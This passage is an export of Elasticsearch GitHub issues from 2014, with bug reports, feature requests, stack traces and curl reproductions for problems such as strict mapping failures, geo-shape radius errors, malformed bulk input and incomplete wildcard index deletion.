u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels /><created>2014-08-18T09:03:24Z</created><updated>2014-08-21T15:07:41Z</updated><resolved>2014-08-18T09:20:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-18T09:11:01Z" id="52468254">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Internal: DistributorDirectory should not invoke distributor when reading an existing file</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7306</link><project id="" key="" /><description>I noticed some hot threads doing this while computing node stats:

```
java.io.UnixFileSystem.getSpace(Native Method)
       java.io.File.getUsableSpace(File.java:1862)
       org.elasticsearch.index.store.distributor.AbstractDistributor.getUsableSpace(AbstractDistributor.java:60)
       org.elasticsearch.index.store.distributor.LeastUsedDistributor.doAny(LeastUsedDistributor.java:45)
       org.elasticsearch.index.store.distributor.AbstractDistributor.any(AbstractDistributor.java:52)
       org.elasticsearch.index.store.DistributorDirectory.getDirectory(DistributorDirectory.java:176)
       org.elasticsearch.index.store.DistributorDirectory.getDirectory(DistributorDirectory.java:144)
       org.elasticsearch.index.store.DistributorDirectory.fileLength(DistributorDirectory.java:113)
       org.apache.lucene.store.FilterDirectory.fileLength(FilterDirectory.java:63)
       org.elasticsearch.common.lucene.Directories.estimateSize(Directories.java:43)
       org.elasticsearch.index.store.Store.stats(Store.java:174)
       org.elasticsearch.index.shard.service.InternalIndexShard.storeStats(InternalIndexShard.java:524)
       org.elasticsearch.action.admin.indices.stats.CommonStats.&lt;init&gt;(CommonStats.java:130)
       org.elasticsearch.action.admin.indices.stats.ShardStats.&lt;init&gt;(ShardStats.java:49)
       org.elasticsearch.action.admin.indices.stats.TransportIndicesStatsAction.shardOperation(TransportIndicesStatsAction.java:195)
       org.elasticsearch.action.admin.indices.stats.TransportIndicesStatsAction.shardOperation(TransportIndicesStatsAction.java:53)
       org.elasticsearch.action.support.broadcast.TransportBroadcastOperationAction$ShardTransportHandler.messageReceived(TransportBroadcastOperationAction.java:338)
       org.elasticsearch.action.support.broadcast.TransportBroadcastOperationAction$ShardTransportHandler.messageReceived(TransportBroadcastOperationAction.java:324)
       org.elasticsearch.transport.netty.MessageChannelHandler$RequestHandler.run(MessageChannelHandler.java:275)
       java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
       java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
       java.lang.Thread.run(Thread.java:745)
```

Which is odd because why would we invoke the least_used distributor when checking fileLength (or opening for read, in other cases) an already-existing file?  Seems like we should only check this when writing a new file.

Looking at line 176 of 1.x of DistributorDirectory.java, it looks like we do this to simplify concurrency (so we can use CHM.putIfAbsent), but I think we should fix this code to only invoke the distributor when it's writing a new file?
</description><key id="40454185">7306</key><summary>Internal: DistributorDirectory should not invoke distributor when reading an existing file</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">mikemccand</reporter><labels><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-18T04:10:50Z</created><updated>2014-09-30T08:51:25Z</updated><resolved>2014-08-19T12:55:49Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-30T08:51:25Z" id="57284430">FYI - I relabelled this since it's a bug
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Feature: retrieve N records before/after specific record.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7305</link><project id="" key="" /><description>in search result we get only the records which match the search criteria.
in many cases I need to know what's happen before/after this record

eg:

[2014-08-17 08:04:45.306] [Debug] - start receiving request 123456 
[2014-08-17 08:04:45.741] [Debug] - request have been terminated

in example above, if I searched for  reques number 123456, i'll only get the first record.
I need to know what happened to this request

is there is any way to do that?
</description><key id="40430334">7305</key><summary>Feature: retrieve N records before/after specific record.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">metwally</reporter><labels /><created>2014-08-17T09:26:06Z</created><updated>2014-08-18T13:15:07Z</updated><resolved>2014-08-18T09:44:31Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-18T09:44:31Z" id="52471184">Hi @metwally 

Please use the forum for questions like this.  The github issues list is for bug reports and feature requests.  In answer to your question: the way to do it is to do a query that gives you the timestamp of the doc you're after, then do another query with a timestamp range to get the surrounding ones.
</comment><comment author="metwally" created="2014-08-18T13:05:24Z" id="52488813">Hi @clintongormley 

Thank your for your consideration.
I just have a question.
why we can't consider this post as "Feature Request" ?
since the feature is not exist!
it will be very useful.
</comment><comment author="clintongormley" created="2014-08-18T13:15:06Z" id="52489813">Hi @metwally 

The problem is that this is not an easy feature to generalise.  Internally, we would have to do it in the exactly the same way as you can do it externally today, but externally you have the luxury of adapting it exactly to your use case.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Mapping: First index of nested value as an array fails when dynamic is strict</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7304</link><project id="" key="" /><description>This works on 1.3.1, fails in master:

```
DELETE /myapp
PUT /myapp
{
   "mappings" : {
      "multiuser" : {
         "properties" : {
            "timestamp" : {
               "type" : "date"
            },
            "entry" : {
               "properties" : {
                  "last" : {
                     "type" : "string"
                  },
                  "first" : {
                     "type" : "string"
                  }
               },
               "dynamic" : "strict",
               "type" : "nested"
            }
         },
         "_timestamp" : {
            "path" : "timestamp",
            "enabled" : 1
         },
         "numeric_detection" : 1,
         "dynamic" : "strict"
      }
   },
   "settings" : {}
}

POST /myapp/multiuser?op_type=create
{
   "timestamp" : 1408198082386,
   "entry" : [
      {
         "first" : "john",
         "last" : "smith"
      }
   ]
}
```

This throws: StrictDynamicMappingException[mapping set to strict, dynamic introduction of [entry] within [multiuser] is not allowed]

```
at org.elasticsearch.index.mapper.object.ObjectMapper.serializeArray(ObjectMapper.java:604)
at org.elasticsearch.index.mapper.object.ObjectMapper.parse(ObjectMapper.java:489)
at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:533)
at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:482)
at org.elasticsearch.index.shard.service.InternalIndexShard.prepareCreate(InternalIndexShard.java:384)
at org.elasticsearch.action.index.TransportIndexAction.shardOperationOnPrimary(TransportIndexAction.java:193)
at org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction.performOnPrimary(TransportShardReplicationOperationAction.java:532)
at org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction$1.run(TransportShardReplicationOperationAction.java:431)
at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
at java.lang.Thread.run(Thread.java:722)
```
</description><key id="40411591">7304</key><summary>Mapping: First index of nested value as an array fails when dynamic is strict</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">clintongormley</reporter><labels><label>bug</label></labels><created>2014-08-16T14:13:02Z</created><updated>2014-08-18T09:21:04Z</updated><resolved>2014-08-18T09:20:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-16T14:15:24Z" id="52394267">@colings86 i think this may be related to the change in #6939 
</comment><comment author="jpountz" created="2014-08-18T09:11:46Z" id="52468324">I'm not sure this change needs version labels since the bug has not been released?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Refactored TransportMessage context</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7303</link><project id="" key="" /><description>Removed CHM in favour of an OpenHashMap and synchronized accessor/mutator methods. Also, the context is now lazily inititialied (just like we do with the headers)
</description><key id="40409601">7303</key><summary>Refactored TransportMessage context</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/uboness/following{/other_user}', u'events_url': u'https://api.github.com/users/uboness/events{/privacy}', u'organizations_url': u'https://api.github.com/users/uboness/orgs', u'url': u'https://api.github.com/users/uboness', u'gists_url': u'https://api.github.com/users/uboness/gists{/gist_id}', u'html_url': u'https://github.com/uboness', u'subscriptions_url': u'https://api.github.com/users/uboness/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/211019?v=4', u'repos_url': u'https://api.github.com/users/uboness/repos', u'received_events_url': u'https://api.github.com/users/uboness/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/uboness/starred{/owner}{/repo}', u'site_admin': False, u'login': u'uboness', u'type': u'User', u'id': 211019, u'followers_url': u'https://api.github.com/users/uboness/followers'}</assignee><reporter username="">uboness</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-16T12:13:27Z</created><updated>2015-06-07T12:23:12Z</updated><resolved>2014-09-09T11:41:18Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="spinscale" created="2014-08-18T07:38:51Z" id="52460574">one minor comment (possiblgy to ignore), like the lazy initialization..

apart from that LGTM
</comment><comment author="kimchy" created="2014-09-04T12:19:14Z" id="54464376">LGTM
</comment><comment author="s1monw" created="2014-09-08T15:35:30Z" id="54838854">this one gets stale - @uboness wanna push this?
</comment><comment author="uboness" created="2014-09-09T11:41:18Z" id="54957195">this was fixed as part of 5df9c048feeecd8c549c1350335514250a77ed2e
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fixed a request headers bug in transport client</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7302</link><project id="" key="" /><description>where the configured request headers were not sent with sniffing requests (both node/info &amp; cluster state sniffing)
</description><key id="40399202">7302</key><summary>Fixed a request headers bug in transport client</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">uboness</reporter><labels><label>:Internal</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-16T01:02:11Z</created><updated>2015-06-07T19:07:23Z</updated><resolved>2014-08-16T02:10:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-08-16T01:44:11Z" id="52378728">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Geo: Geo-shape circles using `radius` as diameter</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7301</link><project id="" key="" /><description>```
PUT /attractions
{
  "mappings": {
    "landmark": {
      "properties": {
        "name": {
          "type": "string"
        },
        "location": {
          "type": "geo_shape"
        }
      }
    }
  }
}

PUT /attractions/landmark/dam_square
{
    "name" : "Dam Square, Amsterdam",
    "location" : {
        "type" : "polygon", 
        "coordinates" : [[ 
          [ 4.89218, 52.37356 ], 
          [ 4.89205, 52.37276 ], 
          [ 4.89301, 52.37274 ], 
          [ 4.89392, 52.37250 ], 
          [ 4.89431, 52.37287 ], 
          [ 4.89331, 52.37346 ], 
          [ 4.89305, 52.37326 ], 
          [ 4.89218, 52.37356 ]
        ]]
    }
}
```

This point is less than 700m from the above shape, but the search only matches if you set the radius to 1.4km, ie twice the distance:

```
GET /attractions/landmark/_search
{
  "query": {
    "geo_shape": {
      "location": {
        "shape": {
          "type": "circle",
          "coordinates": [
            4.89994,
            52.37815
          ],
          "radius": "1.4km"
        }
      }
    }
  }
}
```

I've tried the same thing at much bigger distances and it exhibits the same problem. The radius needs to be double the distance in order to overlap, which makes me think that it is being used as a diameter instead.
</description><key id="40379168">7301</key><summary>Geo: Geo-shape circles using `radius` as diameter</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">clintongormley</reporter><labels><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-15T19:57:56Z</created><updated>2014-08-21T15:13:48Z</updated><resolved>2014-08-20T15:24:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="tincugabriel" created="2014-08-18T11:37:21Z" id="52480959">Is this an elasticsearch bug or a spatial4j bug ? The code and comments for SpatialContext.makeCircle() , which is being used , names the parameter distance instead of radius, which seems a bit ambiguous to me 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Disable native client if not used.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7300</link><project id="" key="" /><description>So from reading around one way people secure their ES boxes is to put it on it's own subnet, block access to port 9300 and expose it only through 9200 using the various plugins, or reverse proxy.

It would be nice to be able to have a flag maybe disable 9300 to just intercluster coms and not allow native client to connect.

One could argue that the system could be turned on and off and the flag reset, but thats alot more noticeable then someone casual connecting to 9300 with their rogue app that connects direct and does what they want it to do.
</description><key id="40378524">7300</key><summary>Disable native client if not used.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">javadevmtl</reporter><labels /><created>2014-08-15T19:50:05Z</created><updated>2014-08-18T09:35:54Z</updated><resolved>2014-08-18T09:35:54Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-18T09:35:54Z" id="52470490">@javadevmtl port 9300 needs to be enabled for communication between nodes, you can't just close it. if somebody is inside your network then they can behave just like any other node.  The answer here is to setup your firewall properly.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>It is possible to index a document that contains two discrete JSON objects</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7299</link><project id="" key="" /><description>This is most noticeable with bulk requests because of the bulk format.  Since the newline is used as a separator, omitting a newline will index a document that contains two JSON objects.  The first JSON object is indexed properly, while the second is completely ignored (not found in the mapping, etc).

However, this causes problems with source retrieval, search, GET, etc because the JSON is invalid.

There should either be an error returned when trying to index a document containing two (or more) discrete objects, or the non-indexed objects should be removed from the source.  The exception seems preferable so the user knows something went wrong.
#### Reproduction (Bulk):

``` bash
curl -XPOST "http://localhost:9200/cars/transactions/_bulk" -d'
{ "index": {"_id":1}}
{ "price" : 10000, "color" : "red", "make" : "honda", "sold" : "2014-10-28" }{ "index": {"_id":2}}
{ "price" : 20000, "color" : "red", "make" : "honda", "sold" : "2014-11-05" }
{ "index": {"_id":3}}
{ "price" : 30000, "color" : "green", "make" : "ford", "sold" : "2014-05-18" }
'

{
   "took": 72,
   "errors": false,
   "items": [
      {
         "index": {
            "_index": "cars",
            "_type": "transactions",
            "_id": "1",
            "_version": 1,
            "status": 201
         }
      }
   ]
}
```

``` bash
curl -XGET "http://localhost:9200/cars/transactions/1"

{
   "_index":"cars",
   "_type":"transactions",
   "_id":"1",
   "_version":1,
   "found":true,
   "_source":{
      "price":10000,
      "color":"red",
      "make":"honda",
      "sold":"2014-10-28"
   }   {
      "index":{
         "_id":2
      }
   }
}
```
#### Reproduction (Single Doc):

``` bash
curl -XPOST "http://localhost:9200/cars/transactions/5" -d'
{ "price" : 10000, "color" : "red", "make" : "honda", "sold" : "2014-10-28" }{ "index": {"_id":2}}'

{
   "_index": "cars",
   "_type": "transactions",
   "_id": "5",
   "_version": 1,
   "created": true
}
```

``` bash
curl -XGET "http://localhost:9200/cars/transactions/5"

{
   "_index":"cars",
   "_type":"transactions",
   "_id":"5",
   "_version":1,
   "found":true,
   "_source":{
      "price":10000,
      "color":"red",
      "make":"honda",
      "sold":"2014-10-28"
   }   {
      "index":{
         "_id":2
      }
   }
}
```
</description><key id="40373368">7299</key><summary>It is possible to index a document that contains two discrete JSON objects</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">polyfractal</reporter><labels><label>bug</label><label>stalled</label></labels><created>2014-08-15T18:45:57Z</created><updated>2015-10-30T13:19:14Z</updated><resolved>2015-10-30T13:19:14Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-18T09:32:35Z" id="52470228">This will probably be fixed by #2315 
</comment><comment author="polyfractal" created="2015-10-30T13:19:14Z" id="152521829">Closing this, resolved by #11414.  If you attempt to index a "double" JSON object, ES throws an exception up-front now instead of silently accepting it:

``` json
{
   "error": {
      "root_cause": [
         {
            "type": "illegal_argument_exception",
            "reason": "Malformed action/metadata line [3], expected START_OBJECT or END_OBJECT but found [VALUE_NUMBER]"
         }
      ],
      "type": "illegal_argument_exception",
      "reason": "Malformed action/metadata line [3], expected START_OBJECT or END_OBJECT but found [VALUE_NUMBER]"
   },
   "status": 400
}
```
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Support querying more indices than 4096 bytes-worth</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7298</link><project id="" key="" /><description>Background: Most logstash users use the default "logstash-YYYY.MM.dd" index naming scheme. Some use hourly. The main way to access Elasticsearch in this use case is often Kibana.

In Elasticsearch 1.3.1 (and older, probably), aborts a query if the request line itself is longer than 4096 bytes, which limites the default logstash use case to about 195 days of querying (each day is 20 bytes of index name, plus comma, 4096 / 21 = 195.04;ignoring remainder of request line)
For hourly partitions, this limits you to 170 indices (7 days of data).

It would be lovely if users could still use these partitioning schemes and query more than 195 days (or 7 days, for hourly indexes) of data in a single query.

Related: https://github.com/elasticsearch/kibana/issues/1406
</description><key id="40373234">7298</key><summary>Support querying more indices than 4096 bytes-worth</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/spinscale/following{/other_user}', u'events_url': u'https://api.github.com/users/spinscale/events{/privacy}', u'organizations_url': u'https://api.github.com/users/spinscale/orgs', u'url': u'https://api.github.com/users/spinscale', u'gists_url': u'https://api.github.com/users/spinscale/gists{/gist_id}', u'html_url': u'https://github.com/spinscale', u'subscriptions_url': u'https://api.github.com/users/spinscale/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/667544?v=4', u'repos_url': u'https://api.github.com/users/spinscale/repos', u'received_events_url': u'https://api.github.com/users/spinscale/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/spinscale/starred{/owner}{/repo}', u'site_admin': False, u'login': u'spinscale', u'type': u'User', u'id': 667544, u'followers_url': u'https://api.github.com/users/spinscale/followers'}</assignee><reporter username="">jordansissel</reporter><labels /><created>2014-08-15T18:44:30Z</created><updated>2014-10-18T17:35:46Z</updated><resolved>2014-10-18T17:35:46Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="spinscale" created="2014-08-18T07:49:39Z" id="52461404">I think you can change this behaviour by setting `http.netty.max_initial_line_length` to a ByteSizeValue like `10kb`, default is `4kb`
</comment><comment author="clintongormley" created="2014-08-18T09:50:04Z" id="52471650">Of course there may be a proxy in the way with a similar limitation.  However, there are a few ways of handling this already:
1. Use a multi-search request, in which case the index names are in the body
2. Use wildcards: `logstash-2012*,logstash-2013*,logstash-2014-01*,logstash-2014-02*` etc
3. Use aliases 
</comment><comment author="spinscale" created="2014-10-17T21:29:10Z" id="59579103">bumping @clintongormley, any action to take here on ES side?
</comment><comment author="clintongormley" created="2014-10-18T09:40:17Z" id="59605045">@spinscale I don't think so, unless @jordansissel disagrees?
</comment><comment author="jordansissel" created="2014-10-18T17:35:46Z" id="59622832">+1 I don't believe there's any action to take, given:
- Users can tune this for their situation
- Kibana 4 solves my original problem (https://github.com/elasticsearch/kibana/issues/1406)
- Any default value may not be a "great" default value, so the current default seems reasonable :)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Feature: Ability to specify and log slow _percolate calls</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7297</link><project id="" key="" /><description>We currently have the capability to log slow queries that exceed a threshold using the following settings:

index.search.slowlog.*

For _percolate calls, it is also possible to run into situations where a we might be interested to know when percolation is having bottlenecks and it would be a nice option to log percolate calls that exceed a threshold just like the above settings for search.
</description><key id="40366547">7297</key><summary>Feature: Ability to specify and log slow _percolate calls</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bly2k</reporter><labels><label>:Percolator</label><label>adoptme</label><label>feature</label></labels><created>2014-08-15T17:21:09Z</created><updated>2016-03-21T11:36:42Z</updated><resolved>2016-03-21T11:36:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="julianhille" created="2014-08-20T20:17:17Z" id="52837276">we also would like to log if a percolation would exceed a certain amount of memory.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Core: remove ConcurrentHashMapV8</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7296</link><project id="" key="" /><description>In #6400 we pulled in a snapshot of CHM V8 to reduce RAM overhead, notable for the live version map.

But I think this is actually quite risky going forward .. the implementation in the OpenJDK has already changed quite a bit since Doug Lea's version, and it's risky if we don't pull in bug fixes.

I think we should just revert back to the JVM's implementation?  Users can upgrade to Java 8 to reduce RAM usage ... I think this means we need to conditionalize the RAM usage logic in LiveVersionMap.
</description><key id="40365445">7296</key><summary>Core: remove ConcurrentHashMapV8</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">mikemccand</reporter><labels><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-15T17:06:45Z</created><updated>2014-09-11T10:58:01Z</updated><resolved>2014-08-26T10:10:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikemccand" created="2014-08-15T17:23:47Z" id="52333719">Also, I think separately (#6392) we can think about more RAM efficient data structures to hold live versions ... then we don't rely on CHM's RAM efficiency here.
</comment><comment author="cfontes" created="2014-08-18T02:25:59Z" id="52445051">How can I help?

This **_looks**_ easy enough for a newcomer like me.
</comment><comment author="mikemccand" created="2014-08-18T09:57:57Z" id="52472335">Hi @cfontes I think it should be straightforward; it should amount to just reverting the commit from #6400?  Do you have an iCLA on file?
</comment><comment author="cfontes" created="2014-08-19T01:35:02Z" id="52579833">Ok.

I do now.
</comment><comment author="cfontes" created="2014-08-22T06:32:27Z" id="53027734">Here it is  #7392
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>INDEX DELETE with wildcard doesn't delete all matching indexes</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7295</link><project id="" key="" /><description>When trying to delete multiple indexes, Issuing a DELETE with a wildcard seems to delete 20 indexes at a time and then returns with an {"acknowledge":"true"}. If this is correct behavior then this should be added to the documentation index\delete documentation, otherwise it needs to be fixed.

For example...

DELETE http://192.168.10.73:55590/*event.2013-* HTTP/1.1

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=UTF-8
Content-Length: 21

{&amp;quot;acknowledged&amp;quot;:true}
</description><key id="40353899">7295</key><summary>INDEX DELETE with wildcard doesn't delete all matching indexes</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">andrassy</reporter><labels><label>bug</label></labels><created>2014-08-15T14:52:20Z</created><updated>2015-10-29T19:47:54Z</updated><resolved>2015-10-27T15:14:29Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-18T09:24:50Z" id="52469586">@andrassy Could you try this instead:

```
DELETE /*event.2013*
```

I suspect that the `-` is being interpreted as a negative
</comment><comment author="clintongormley" created="2014-08-18T09:26:47Z" id="52469737">Related to #6736 
</comment><comment author="OlegYch" created="2014-09-17T15:12:57Z" id="55908763">i'm facing the same issue using 1.3.2
here is my request:
DELETE logstash_,.marvel_,-.marvel-kibana,-logstash-2014.09.17,-logstash-2014.09.16,-logstash-2014.09.15,-logstash-2014.09.14,-logstash-2014.09.13,-logstash-2014.09.12,-logstash-2014.09.11,-logstash-2014.09.10,-logstash-2014.09.09,-logstash-2014.09.08,-.marvel-2014.09.17,-.marvel-2014.09.16,-.marvel-2014.09.15,-.marvel-2014.09.14,-.marvel-2014.09.13,-.marvel-2014.09.12,-.marvel-2014.09.11,-.marvel-2014.09.10,-.marvel-2014.09.09,-.marvel-2014.09.08
</comment><comment author="andrassy" created="2014-09-25T09:20:34Z" id="56793875">We still face the same issue with DELETE/_event.2013_ so it's not explicitly the wildcarding.

Sometimes I get an acknowledged:true and other times I get "ProcessClusterEventTimeoutException[failed to process cluster event (delete-index [.......................]) within 30s]".

Might be related to #7799 where executions are rejected as the master is stressed (which is why I'm trying to delete lots of historic indexes).
</comment><comment author="clintongormley" created="2014-10-31T11:28:09Z" id="61247926">@andrassy When 1.4 is out, please could you check whether the delete index command works as expected (ie has been fixed y #7799) and let us know

thanks
</comment><comment author="bobrik" created="2014-12-02T17:10:03Z" id="65266187">@clintongormley index delete even without wildcard is failing to remove all indices.

Creating 25 indices `hey-{1..25}`, removing all them in one request:

```
# for i in {1..25}; do curl -s -X PUT http://web245:9200/hey-$i?pretty; done &amp;&amp; sleep 10 &amp;&amp; curl -s 'http://web245:9200/_cat/indices/hey-*?h=index' | sort &amp;&amp; curl -s -X DELETE http://web245:9200/hey-1,hey-2,hey-3,hey-4,hey-5,hey-6,hey-7,hey-8,hey-9,hey-10,hey-11,hey-12,hey-13,hey-14,hey-15,hey-16,hey-17,hey-18,hey-19,hey-20,hey-21,hey-22,hey-23,hey-24,hey-25?pretty &amp;&amp; curl -s 'http://web245:9200/_cat/indices/hey-*?v=index' | sort
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
